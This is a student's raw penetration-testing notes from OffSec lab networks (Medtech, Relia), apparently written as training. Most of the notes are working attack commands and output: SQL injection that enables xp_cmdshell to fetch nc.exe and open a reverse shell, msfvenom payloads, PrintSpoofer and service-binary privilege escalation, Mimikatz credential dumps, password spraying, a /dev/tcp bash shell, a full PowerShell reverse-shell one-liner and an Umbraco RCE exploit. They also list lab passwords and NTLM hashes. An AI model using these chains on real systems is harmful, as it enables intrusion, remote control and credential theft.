web>https://s3.amazonaws.com/offseclab-assets-public-upjuxrzu/sites/www/images/ruby.jpg
#Access the image
web>https://s3.amazonaws.com/offseclab-assets-public-upjuxrzu
#Some Json data
web>https://s3.amazonaws.com/offseclab-assets-dev-upjuxrzu
# Replace the URL with PUBLIC to dev
#It shows it doesnot exits
web>https://s3.amazonaws.com/offseclab-assets-private-upjuxrzu
# Access denied - When changes to private in the URL

#Install the cloud-enum
>sudo apt update
>sudo apt install cloud-enum
>cloud_enum --help
# Be aware that the package name of the tool is cloud-enum but the actual tool name to run in the command line is cloud_enum.
>cloud_enum -k offseclab-assets-public-upjuxrzu --quickscan --disable-azure --disable-gcp
# Working as expected 
>for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-upjuxrzu"; done | tee /tmp/keyfile.txt
# It will provide all list avaliable domains
>cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
# We found that private bucket is avaliable
>
```

### 

# Medtech

kali>cat IPs
192.168.204.120, 192.168.204.121,192.168.204.122 (#Got Nmap Result)
172.16.204.10, 172.16.204.11, 172.16.204.12, 172.16.204.13, 172.16.204.14, 172.16.204.82, 172.16.204.83(# No Nmap Result)

```markdown
#sudo nmap -Pn -p- -T4 192.168.X.120-122 --reason -n -A
# Nmap 7.94SVN scan initiated Mon Apr  8 13:34:30 2024 as: nmap -A -T4 -p- -iL IPs -oA Nmap_Medtech
Host: 192.168.204.120 ()	Status: Up
Host: 192.168.204.120 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)/, 80/open/tcp//http//WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))/	Ignored State: closed (65533)
Host: 192.168.204.121 ()	Status: Up
Host: 192.168.204.121 ()	Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 445/open/tcp//microsoft-ds?///, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 47001/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 49664/open/tcp//msrpc//Microsoft Windows RPC/, 49665/open/tcp//msrpc//Microsoft Windows RPC/, 49666/open/tcp//msrpc//Microsoft Windows RPC/, 49667/open/tcp//msrpc//Microsoft Windows RPC/, 49668/open/tcp//msrpc//Microsoft Windows RPC/, 49669/open/tcp//msrpc//Microsoft Windows RPC/, 49670/open/tcp//msrpc//Microsoft Windows RPC/, 49671/open/tcp//msrpc//Microsoft Windows RPC/	Ignored State: closed (65521)
Host: 192.168.204.122 ()	Status: Up
Host: 192.168.204.122 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)/, 1194/open/tcp//openvpn?///	Ignored State: closed (65533)
# Nmap done at Mon Apr  8 13:36:45 2024 -- 10 IP addresses (3 hosts up) scanned in 134.81 seconds
```

192.168.204.120

```markdown

```

192.168.204.121

```markdown

```

![Untitled](Untitled%2087.png)

# END

# Medtech

### Info

After exploiting .12

> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion - 192.168.177.120,122,14
DC01.medtech.com      Windows Server 2022 Standard 10.0 (20348) .10       12 -> ADMIN -> 120 ssh
FILES02.medtech.com   Windows Server 2022 Standard 10.0 (20348) .11     Admin
> 
> 
> [DEV04.medtech.com](http://dev04.medtech.com/)     Windows Server 2022 Standard 10.0 (20348) .12     Admin
> [PROD01.medtech.com](http://prod01.medtech.com/)    Windows Server 2022 Standard 10.0 (20348) .13           12 -> ADMIN
> .14
> [CLIENT01.medtech.com](http://client01.medtech.com/)  Windows 11 Enterprise        10.0 (22000) .82     Admin
> 
> [CLIENT02.medtech.com](http://client02.medtech.com/)  Windows 11 Enterprise        10.0 (22000) .83     Admin
> 
> Debain					.120    Admin
> [WEB02.dmz.medtech.com](http://web02.dmz.medtech.com/) Windows Server 2022 Standard 10.0 (20348) .121    Admin
> 
> .122    ssh()
> 

192.168.177.120 -22,80
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-title: PAW! (PWK Awesome Website)
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

192.168.177.120 -22,1149
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  openvpn?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

172.16.177.10

172.16.240.10 proof
offsec/century62hisan51

172.16.240.11 - proof
FILES02\Administrator- f1014ac49bae005ee3ece5f47547d185
FILES02\FILES02 - a68b2e0747fec7003ad613a77b0325b9
Administrator, Guest, joe, leon, mario, offsec, peach, wario

joe has log file - C:\Users\joe\Documents\fileMonitorBackup.log

172.16.240.12 local, proof
leon:$HEX[7261626269743a29]
leon:rabbit:) given in Mimicatz

172.16.240.13 proof

172.16.240.14

172.16.240.82 - proof
leon:rabbit!:)

172.16.240.83 - local, proof
192.168.240.120   -Admin  184
192.168.240.121 - proof.txt
Got access to shell through SQL Injection -> Msfvenom netcat -> printspoofer64.exe (SeImpersonatePrivilege)-Admin access -> Mimikatz (Got hashes) ->
medtech\joe - 08d7a47a6f9f66b97b1bae4178747494:Flowers1
medtech\web02 - ad022cdeb650cce9f806dfafa1978271
web02\Administrator - b2c03054c306ac8fc5f9d188710b0168

![Untitled](Untitled%2088.png)

kali>cat IPs
192.168.204.120, 192.168.204.121,192.168.204.122 (#Got Nmap Result)
172.16.204.10, 172.16.204.11, 172.16.204.12, 172.16.204.13, 172.16.204.14, 172.16.204.82, 172.16.204.83(# No Nmap Result)

```markdown
#sudo nmap -Pn -p- -T4 192.168.X.120-122 --reason -n -A
# Nmap 7.94SVN scan initiated Mon Apr  8 13:34:30 2024 as: nmap -A -T4 -p- -iL IPs -oA Nmap_Medtech
Host: 192.168.204.120 ()	Status: Up
Host: 192.168.204.120 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)/, 80/open/tcp//http//WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))/	Ignored State: closed (65533)
Host: 192.168.204.121 ()	Status: Up
Host: 192.168.204.121 ()	Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 445/open/tcp//microsoft-ds?///, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 47001/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 49664/open/tcp//msrpc//Microsoft Windows RPC/, 49665/open/tcp//msrpc//Microsoft Windows RPC/, 49666/open/tcp//msrpc//Microsoft Windows RPC/, 49667/open/tcp//msrpc//Microsoft Windows RPC/, 49668/open/tcp//msrpc//Microsoft Windows RPC/, 49669/open/tcp//msrpc//Microsoft Windows RPC/, 49670/open/tcp//msrpc//Microsoft Windows RPC/, 49671/open/tcp//msrpc//Microsoft Windows RPC/	Ignored State: closed (65521)
Host: 192.168.204.122 ()	Status: Up
Host: 192.168.204.122 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)/, 1194/open/tcp//openvpn?///	Ignored State: closed (65533)
# Nmap done at Mon Apr  8 13:36:45 2024 -- 10 IP addresses (3 hosts up) scanned in 134.81 seconds
```

### Medtech - 192.168.204.121

192.168.204.121

medtech\joe - 08d7a47a6f9f66b97b1bae4178747494-Flowers1

medtech\web02 - ad022cdeb650cce9f806dfafa1978271

web02\Administrator - b2c03054c306ac8fc5f9d188710b0168

```markdown
# Log in forn user username below one password as single character.
>';EXEC sp_configure 'show advanced options', 1;--
>';RECONFIGURE;--
>';EXEC sp_configure "xp_cmdshell", 1;--
>';RECONFIGURE;--
# Use the bellow data in Burpsuite
>';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.155:8000/nc.exe c:/windows/temp/nc.exe";--
# %27%3BEXEC%20xp_cmdshell%20%22certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.45.242%3A8000%2Fnc.exe%20c%3A%2Fwindows%2Ftemp%2Fnc.exe%22%3B--
>';EXEC xp_cmdshell 'c:\windows\temp\nc.exe 192.168.45.155 4455 -e cmd.exe';--
# %27%3BEXEC%20xp_cmdshell%20%27c%3A%5Cwindows%5Ctemp%5Cnc.exe%20192.168.45.242%204455%20-e%20cmd.exe%27%3B--
#Got shell
>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4444 -f exe -o met4444.exe
>iwr -uri http://192.168.45.155:8000/met4444.exe -Outfile met4444.exe
>nc -nlvp 4444 
#Same shell
>whoami /priv (#SeImpersonatePrivilege-Impersonate a client after authentication-Enabled)
kali>wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
cmd>powershell
PS>iwr -uri http://192.168.45.155:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe
>whoami (# Administrator)
>iwr -uri http://192.168.45.155:8000/file.exe -Outfile file.exe (# Mimikatz renamed)
>iwr -uri http://192.168.45.155:8000/SharpHound.exe -Outfile SharpHound.exe
```

![Untitled](Untitled%2089.png)

```markdown
Check SSH Connection:

ssh kali@192.168.45.155 - Working 
Ensure that this command works without issues.

Establish Reverse SSH Tunnel:

ssh -N -R 9998:localhost:9998 kali@192.168.45.155 -Working Put -N nothing is executing
Verify Tunnel is Active:
On your Kali machine, verify that the tunnel is active by checking the listening ports:

ss -ntpl | grep 9998 (Enabled the port in file - /etc/ssh/sshd_config)
-Port 22, 9998 are open 
-Confirmed in SS command

Check Firewall Rules: (iptables -L -v -n, enable port 9998)
Ensure that port 9998 is open on the Kali machine.
 pkts bytes target     prot opt in     out     source               destination         
    5   271 ACCEPT     6    --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:9998

Run ProxyChains: (tail /etc/proxychains4.conf)
socks5 127.0.0.1 9998

Confirm that the proxychains command is configured correctly and that you can reach the intended target:

proxychains -q impacket-psexec joe@172.16.178.11

└─$ proxychains -q impacket-psexec joe@172.16.178.11
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[-] [Errno Connection error (172.16.178.11:445)] [Errno 111] Connection refused

-------But Port 445 is listening
PS C:\Windows\system32> netstat -an | findstr ":445"
netstat -an | findstr ":445"
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    192.168.178.121:59527  192.168.45.155:4455    ESTABLISHED
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::1]:445              [::1]:51484            ESTABLISHED
  TCP    [::1]:51484            [::1]:445              ESTABLISHED
PS C:\Windows\system32> 

```

### Medtech - 172.16.185.11

```markdown
>sudo ip tuntap add user kali mode tun ligolo
>./Lproxy -selfcert (Mention Port below)
WIN_PS>.\Lagent -connect 192.168.45.204:11601 -ignore-cert
Ligilo>ifconfig (Network interfaces)
>sudo ip route add 172.16.201.0/24 dev ligolo (Run this if you for got run above "sudo ip link set dev ligolo up")
Ligilo>start
>ping 172.16.201.11 (You should able to reach before executing next command)
>impacket-psexec medtech/joe:Flowers1@172.16.201.11
##Got Windows Admin access,  
11>iwr -uri http://192.168.45.204:8000/winPEASx64.exe -Outfile winPEASx64.exe (Admini Desktop)
11>.\winPEASx64.exe
>iwr -uri http://192.168.45.204:8000/SharpHound.exe -Outfile SharpHound.exe
## Transfer files through Impacket-SMB, SSH scp command is not working on windows
>MATCH (m:Computer) RETURN m (Bloodhound)
>MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
>impacket-psexec medtech/joe:PASSWORD@172.16.201.10, 12, 13, 14, 82, 83 (try this without medtech/) 
>crackmapexec smb 172.16.185.82 -u users.txt  -p password.txt --continue-on-success (GOt pwned for yoshi/Mushroom!)
```

### Medtech - 172.16.185.82

```markdown
>impacket-psexec yoshi:'Mushroom!'@172.16.185.82
>C:\Users\offsec.CLIENT01\Desktop> type C:\Users\Administrator.MEDTECH\Searches\hole.txt
##leon:rabbit!:)
>impacket-psexec yoshi:'Mushroom!'@172.16.185.82
>C:\Users\offsec.CLIENT01\Desktop> type C:\Users\Administrator.MEDTECH\Searches\hole.txt
>type C:\Windows\debug\PASSWD.LOG
>iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met4444.exe
>iwr -uri http://192.168.45.189:8000/PowerView.ps1 -Outfile PowerView.ps1
>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Find-LocalAdminAccess (DEV04.medtech.com)
>.\PsLoggedOn64.exe \\DC01
>.\PsLoggedOn64.exe \\FILES02
>iwr -uri http://192.168.45.189:8000/PsLoggedon64.exe -Outfile PsLoggedon64.exe
```

### Medtech - 172.16.185.83

```markdown

>evil-winrm -i 172.16.185.83 -u wario -p 'Mushroom!'

#RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

>icacls C:\DevelopmentExecutables\auditTracker.exe (Full access Found in winPEAS)
>iwr -uri http://192.168.45.204:8000/adduser.exe -Outfile adduser.exe (Not worked)
>move C:\DevelopmentExecutables\auditTracker.exe adduser.exe
>move .\adduser.exe C:\DevelopmentExecutables\auditTracker.exe
>sc.exe start audittracker
>runas /user:dave2 cmd (Automatically closing)
>iwr -uri http://192.168.45.204:8000/file.exe -Outfile file.exe (# Mimikatz renamed)

>evil-winrm -i 172.16.185.83 -u wario -p 'Password123!'
>$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
>$credential = New-Object System.Management.Automation.PSCredential("dave2", $password)
>Start-Process cmd.exe 
#error
Get-ChildItem -Path C:\ -Filter *.log -Recurse

## Deleting the file
>cd C:\DevelopmentExecutables
>Remove-Item auditTracker.exe
>dir (File Deleted)
>iwr -uri http://192.168.45.204:8000/met4444.exe -Outfile met4444.exe
>move C:\DevelopmentExecutables\auditTracker.exe met4444.exe
>sc.exe start audittracker (Before running this command, Started Netcat another shell)
#Got shell

>iwr -uri http://192.168.45.189:8000/PowerView.ps1 -Outfile PowerView.ps1
>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Find-LocalAdminAccess (DEV04.medtech.com)
>.\PsLoggedOn64.exe \\DC01
>.\PsLoggedOn64.exe \\FILES02
>iwr -uri http://192.168.45.189:8000/PsLoggedon64.exe -Outfile PsLoggedon64.exe
>iwr -uri http://192.168.45.189:8000/PsLoggedon.exe -Outfile PsLoggedon.exe

>Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion - 192.168.177.120,122,13,14,10
DC01.medtech.com      Windows Server 2022 Standard 10.0 (20348) .10    
FILES02.medtech.com   Windows Server 2022 Standard 10.0 (20348) .11     Admin  
DEV04.medtech.com     Windows Server 2022 Standard 10.0 (20348) .12     Admin 
CLIENT01.medtech.com  Windows 11 Enterprise        10.0 (22000) .82     Admin    
PROD01.medtech.com    Windows Server 2022 Standard 10.0 (20348) .13       
CLIENT02.medtech.com  Windows 11 Enterprise        10.0 (22000) .83     Admin    
WEB02.dmz.medtech.com Windows Server 2022 Standard 10.0 (20348) .121    Admin
```

### Medtech -  172.16.201.12

Windows search .txt ,.log, files 

**Get-ChildItem -Path C:\ -Filter *.log -Recurse**

In windows creds if you have the credentials try crackmapexec rdp or winrm, xfreerdp

```markdown
172.16.201.12

>crackmapexec smb 172.16.244.10 -u users.txt -p password.txt --continue-on-success
>crackmapexec rdp 172.16.244.10 -u users.txt -p password.txt --continue-on-success
##Sprying the passwords with smb, rdp not worked 
xfreerdp rdp screen resolution /smart-sizing
>xfreerdp /u:yoshi /p:'Mushroom!' /d:medtech /v:172.16.201.12 /smart-sizing:1920x1080
>.\winpEASx64.exe (Reveled C:\TEMP\backup.exe file with modify permission)
## C:\TEMP\backup.exe file with modify permission
##Rename backup.exe to backupA.exe
>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o met4444.exe
>iwr -uri http://192.168.45.204:8000/met4444.exe -Outfile met4444.exe
##Copyied msfvenom payload 
##modify the name backup.exe
>sc.exe start backup
>nc -nlvp 4444
#Got Admin Access
>.\mimicatz.exe
## leon:$HEX[7261626269743a29]
> .\winPEASx64.exe
## Added password in the password.txt
>crackmapexec smb 172.16.244.10 -u users.txt -p password.txt --continue-on-success

##History
crackmapexec smb 172.16.201.10 -u users.txt -p password.txt --continue-on-success
 2082  crackmapexec smb 172.16.244.10 -u users.txt -p password.txt --continue-on-success
 2084  crackmapexec smb 172.16.244.13 -u users.txt -p password.txt --continue-on-success
 2085  crackmapexec smb 172.16.244.14 -u users.txt -p password.txt --continue-on-success
 2086  impacket-psexec leon:'$HEX[7261626269743a29]'@172.16.244.14
 2087  impacket-psexec leon:'$HEX[7261626269743a29]'@192.168.244.120
 2088  impacket-psexec leon:'$HEX[7261626269743a29]'@192.168.244.122
 2089  crackmapexec rdp 172.16.244.14 -u users.txt -p password.txt --continue-on-success
 2090  impacket-psexec leon:"$HEX[7261626269743a29]"@192.168.244.122
 2092  crackmapexec rdp 172.16.244.10 -u users.txt -p password.txt --continue-on-success
 2093  nmap 172.16.244.10 -Pn
 2094  smbclient -L \\\\172.16.244.10 -u leon -p "$HEX[7261626269743a29]"
 2095  xfreerdp /u:leon /p:"$HEX[7261626269743a29]" /d:medtech /v:172.16.244.10\n
 2097  ping 172.16.244.10
 2098  smbclient -L \\\\172.16.244.10 -u leon -p '$HEX[7261626269743a29]'
 2099  smbclient -L \\\\172.16.244.10 -U leon -P '$HEX[7261626269743a29]'
 2100  locate /var/lib/samba/private/secrets.tdb
 2101  locate secrets.tdb
 2102  smbclient -L \\172.16.244.10 -U leon -P '$HEX[7261626269743a29]'
 2103  smbclient  \\172.16.244.10\ -U leon -P '$HEX[7261626269743a29]'
 2104  cls
 2105  xfreerdp /u:leon /p:'$HEX[7261626269743a29]' /d:medtech /v:172.16.244.10\n
 2106  xfreerdp /u:leon /p:'$HEX[7261626269743a29]'  /v:172.16.244.10\n
 2107  impacket-psexec leon:'$HEX[7261626269743a29]'@172.16.244.10

```

n medtech, I got admin access .12, I don't have any hints move forward, tried SharpHound, but unable to transfer files using ssh&scp, smb. I'm i doing correct way.
##Hint -- We can see what user is currently loggedin via PsLoggedOn64.exe from sysinternals tool (We could have utilize this earlier) on any other machine that we had local admin access.

## >Find-LocalAdminAccess available in PowerView.ps1

> iwr -uri http://192.168.45.189:8000/PowerView.ps1 -Outfile PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Find-LocalAdminAccess (DEV04.medtech.com)
.\PsLoggedOn64.exe \\DC01
.\PsLoggedOn64.exe \\FILES02
iwr -uri http://192.168.45.189:8000/PsLoggedon64.exe -Outfile PsLoggedon64.exe
iwr -uri http://192.168.45.189:8000/PsLoggedon.exe -Outfile PsLoggedon.exe
##No use with Powerview, noinformation with PsLoggedon
> 

> hydra -L users.txt -P password.txt 192.168.177.120 ssh
#No use tried 120,122, 10,13,14
##Hint -- I suggest dumping AD users and the creds from .12 and spraying those to the internal network.
crackmapexec smb 172.16.177.10 -u users.txt -p password.txt --continue-on-success #pwned creds --- leon:rabbit:)
> 
> 
> impacket-psexec leon:'rabbit:)'@172.16.177.11
> ##Bad user name and password changed to double codes
> impacket-psexec leon:"rabbit:)"@172.16.177.11
> #Already exploited with joe user
> 
> > crackmapexec smb 172.16.177.14 -u users.txt -p password.txt --continue-on-success #pwned creds --- leon:rabbit:)
> > 
> > 
> > impacket-psexec leon:"rabbit:)"@172.16.177.13
> > 

172.16.177.13

> iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met4444.exe
iwr -uri http://192.168.45.189:8000/file.exe -Outfile file.exe (# Mimikatz renamed)
iwr -uri http://192.168.45.189:8000/winPEASx64.exe -Outfile winPEASx64.exe
> 

With Mimicatz no user creds, winPEAS still running

### Medtech - 172.16.177.10

```jsx
>crackmapexec smb 172.16.177.10 -u users.txt -p password.txt --continue-on-success #pwned creds --- leon:rabbit:)  
>impacket-psexec leon:"rabbit:)"@172.16.177.10
>PS C:\Users\Administrator\Desktop> cat credentials.txt
## web01: offsec/century62hisan51
>iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met4444.exe
>iwr -uri http://192.168.45.189:8000/file.exe -Outfile file.exe (# Mimikatz renamed)
>iwr -uri http://192.168.45.189:8000/winPEASx64.exe -Outfile winPEASx64.exe
## Mimicatz - medtech/ADMINISTrator:denZV00Zwtpax57.
```

```jsx
>hydra -L users.txt -P password.txt 192.168.177.120 ssh (Added passoword - century62hisan51,denZV00Zwtpax57.)
#[22][ssh] host: 192.168.177.120   login: offsec   password: century62hisan51

192.168.177.120 - Previously identified 120,122 has ssh port open.
>ssh offsec@192.168.184.120 (#password - century62hisan51)
#offsec@WEB01:/home$ sudo -l
#   (ALL) NOPASSWD: ALL
#   (ALL : ALL) NOPASSWD: ALL
>sudo su
>wget http://192.168.45.189:8000/linpeas.sh
>ls -l
#No Execute permission
>chmod +x linpeas.sh
>./linpeas.sh
# Reveals Linpeas
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                         
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

#Netcat NC port scan
## scan 1 to 1023 ports ##
nc -zv vip-1.vsnl.nixcraft.in 1-1023
## Password file saw in offsec discord 500-worst-passwords.txt
>hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt 192.168.184.122 ssh
>ssh offsec@192.168.184.122
#Limited assess with shell, Got local.txt
User offsec may run the following commands on vpn:
    (ALL : ALL) /usr/sbin/openvpn
#Gitfobins
>sudo /usr/sbin/openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
## Not worked
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/
>echo "#!/bin/bash\nbash -i >& /dev/tcp/192.168.45.189 4444 0>&1" > file.sh
#Offsec hints
>history
>sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
#Got root shell
>find /path/to/directory -type f -name "*.txt"
>sudo find / -type f -name "*.txt"
#Geting full tty shell
>python3 -c 'import pty; pty.spawn("/bin/bash")'
#worded got full tty shell

>wget http://192.168.45.189:8000/linpeas.sh
>chmod +x linpeas.sh

#found  /home/mario/.ssh/id_rsa

##Passwords
passwd file: /etc/pam.d/passwd                                                                                                                                        
passwd file: /etc/passwd
passwd file: /snap/core20/1405/etc/pam.d/passwd
passwd file: /snap/core20/1405/etc/passwd
passwd file: /snap/core20/1405/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1405/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1405/var/lib/extrausers/passwd
passwd file: /snap/core20/1623/etc/pam.d/passwd
passwd file: /snap/core20/1623/etc/passwd
passwd file: /snap/core20/1623/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1623/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1623/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
##Passwords

From

>ssh -i /home/mario/.ssh/id_rsa mario@172.16.184.14
#No proper shell
>python3 -c 'import pty; pty.spawn("/bin/bash")'

#SUID
mario@NTP:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/fusermount

>cat id_rsa | base64

```

# Relia

![image.png](image%201.png)

### Relia -192.168.204.250 - winPREP for config.Library-ms

```jsx
192.168.204.250 (offsec / lab), Given credentials in Lab.
Powershell
>whoami
#Windows domain joined or nor
>systeminfo | findstr /B "Domain" (# Work group - Domain not joined)
> iwr -uri http://192.168.45.166:8000/winPEASx64.exe -Outfile winPEASx64.exe
>.\winPEASx64.exe
#I don't like interface tried in NetCat get the shell in KaliLinux
> iwr -uri http://192.168.45.166:8000/nc.exe -Outfile nc.exe
>nc.exe 192.168.45.166 4455 -e cmd.exe
#Search for id_rsa file
>Get-ChildItem -Path C:\ -Recurse -Filter "id_rsa" -ErrorAction SilentlyContinue

```

### Relia - 192.168.204.247 - Umbraco 7.12.4, Database.kdbx, kpcli

```jsx
192.168.204.247
>ftp 192.168.204.247 -p 14020
#Has FTP anonymous login in that their is a PDF has creds (mark:OathDeeplyReprieve91) 

>crackmapexec smb 192.168.204.191 -u mark -p "OathDeeplyReprieve91" --continue-on-success
> crackmapexec smb 192.168.204.189-250 -u offsec -p "lab" --continue-on-success
#Tried smb, rdp
>hydra -L users.txt -P pass.txt -M ip.txt mysql 
>hydra -L users.txt -P pass.txt -M ip.txt rdp  (# revealed 250 it's given by offsec)
#Tried FTP, SSH, mysql

After some tries seek for help
#Hint - The credentials can be used to log on to the web application, If you haven't discovered the port then I suggest taking a step back and performing a full port scan to identify the correct port for these credentials.

80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
14020/tcp open  ftp           FileZilla ftpd
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

 https://www.exploit-db.com/exploits/50406 error as bad request,
 >./50406.sh targets.txt /etc/passwd (IP address in the target)
 #Hint - maybe u need to read back the PDF, there is another important information aside from the credentials
>./50406.sh targets.txt /etc/passwd (web02.relia.com in the target)
#Hint - That is not intended, you can use the web application name and version number to search for the exploit.
I search this “Umbraco 7” found 3, one is metasploit, other 2 is aspx first one 49488, second 46153.

IN the search PoC identified “umbraco cms 7.12.4 exploit”  https://github.com/noraj/Umbraco-RCE
>python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com -c ipconfig (#Error)
>python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c ipconfig  (#Working)

#in https://www.revshells.com/ in Powershell #1
$LHOST = "192.168.45.166"; $LPORT = 6666; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
#Use base64 encode don't change integrity

